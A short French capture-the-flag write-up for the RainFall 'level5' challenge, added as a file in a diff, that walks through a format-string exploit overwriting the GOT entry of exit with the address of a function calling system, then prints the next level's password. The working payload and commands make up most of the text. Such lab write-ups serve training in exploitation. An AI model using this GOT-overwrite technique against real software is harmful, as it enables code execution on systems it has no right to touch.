@@ -1,0 +1,38 @@
+objdump -d level5
+
+Nous avons deux fonctions 'o' et 'n'
+
+La premier est call nul part mais contient un call a system
+
+Dans la seconde on constate qu'il y a un call a 'exit'
+On va essayer decrire le GOT pour modifier l'addresse de 'exit' par celle de la fonction 'o'
+
+Recuperons l'addresse de exit
+
+objdump -R level5
+
+	08049838 R_386_JUMP_SLOT   exit
+
+0x08049838
+
+L'addresse de la fonction 'o' etant '0x080484a4'
+
+On cherche maintenant l'offset
+
+level5@RainFall:~$ ./level5
+AAAA %x %x %x %x %x
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520
+
+Notre offset est 4
+
+On constate que seul les quatre dernier digits des addresse de la fonction 'o' et de l'exit, sont differents.
+
+Remplacons donc les quatre dernier caracteres par 84a4 (33956 en decimal)
+
+Pour remplacer les deux derniers bytes avec printf, il nous suffit d'utiliser 'hn' 
+
+python -c "print '\x38\x98\x04\x08' + '%33952d' + '%4\$hn'" > /tmp/level5
+
+cd ../level6 && cat .pass
+
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
